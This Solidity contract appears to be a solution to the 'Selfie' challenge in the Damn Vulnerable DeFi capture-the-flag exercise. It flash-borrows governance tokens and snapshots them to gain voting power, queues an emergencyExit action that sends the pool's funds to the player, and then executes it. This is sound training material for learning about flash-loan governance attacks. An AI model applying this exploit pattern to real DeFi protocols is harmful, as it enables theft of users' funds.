//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "hardhat/console.sol";
contract governance1 {
    error UnexpectedFlashLoan();
    SelfiePool pool;
    SimpleGovernance gov;
    DamnValuableTokenSnapshot tokenad;
    address player;
    
    constructor(address _pool,address _gov,address _token,address _player){
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
        tokenad = DamnValuableTokenSnapshot(_token);
        player = _player;
    }
    function flash(uint256 amount) public {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(tokenad), amount ,'');
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        if (initiator != address(this) || msg.sender != address(pool) || token != address(tokenad) || fee != 0)
            revert UnexpectedFlashLoan();
        tokenad.snapshot();
        gov.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)",player));
        tokenad.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
               
    }
    function govaction()public{
        gov.executeAction(1);
    }
}